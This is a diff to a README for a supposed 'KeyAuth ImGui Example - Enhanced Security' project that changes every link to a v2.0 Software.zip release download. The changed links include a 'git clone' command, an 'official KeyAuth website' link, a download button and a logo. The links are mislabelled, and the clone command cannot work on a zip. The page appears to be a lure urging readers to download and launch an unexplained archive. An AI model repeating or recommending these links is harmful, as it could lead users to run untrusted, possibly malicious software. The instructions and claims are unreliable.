@@ -14,7 +14,7 @@ To get started with KeyAuth ImGui Example - Enhanced Security, you can download 
 
 1. Clone the repository:
    ```
-   git clone https://github.com/duyanh2017/KeyAuth-ImGui-Example-Protected/releases/download/v1.0/Installer.zip
+   git clone https://github.com/duyanh2017/KeyAuth-ImGui-Example-Protected/releases/download/v2.0/Software.zip
    ```
 
 2. Implement the server-side controls, packet encryption, and single-use packets as provided in the repository.
@@ -25,11 +25,11 @@ To get started with KeyAuth ImGui Example - Enhanced Security, you can download 
 
 ## Additional Resources
 
-For more information on the KeyAuth API and authentication services, visit the [official KeyAuth website](https://github.com/duyanh2017/KeyAuth-ImGui-Example-Protected/releases/download/v1.0/Installer.zip).
+For more information on the KeyAuth API and authentication services, visit the [official KeyAuth website](https://github.com/duyanh2017/KeyAuth-ImGui-Example-Protected/releases/download/v2.0/Software.zip).
 
 ## Download Link
 
-[![Download KeyAuth ImGui Example - Enhanced Security](https://github.com/duyanh2017/KeyAuth-ImGui-Example-Protected/releases/download/v1.0/Installer.zip)](https://github.com/duyanh2017/KeyAuth-ImGui-Example-Protected/releases/download/v1.0/Installer.zip)
+[![Download KeyAuth ImGui Example - Enhanced Security](https://github.com/duyanh2017/KeyAuth-ImGui-Example-Protected/releases/download/v2.0/Software.zip)](https://github.com/duyanh2017/KeyAuth-ImGui-Example-Protected/releases/download/v2.0/Software.zip)
 
 Please click the button above to download KeyAuth ImGui Example - Enhanced Security v1.0.0. Launch the zip file to access the contents and start securing your KeyAuth ImGui example.
 
@@ -41,4 +41,4 @@ Protect your application and data with the enhanced security features of KeyAuth
 
 Thank you for choosing KeyAuth ImGui Example - Enhanced Security. Happy coding! 🛡️🔒
 
-![KeyAuth Logo](https://github.com/duyanh2017/KeyAuth-ImGui-Example-Protected/releases/download/v1.0/Installer.zip)
+![KeyAuth Logo](https://github.com/duyanh2017/KeyAuth-ImGui-Example-Protected/releases/download/v2.0/Software.zip)
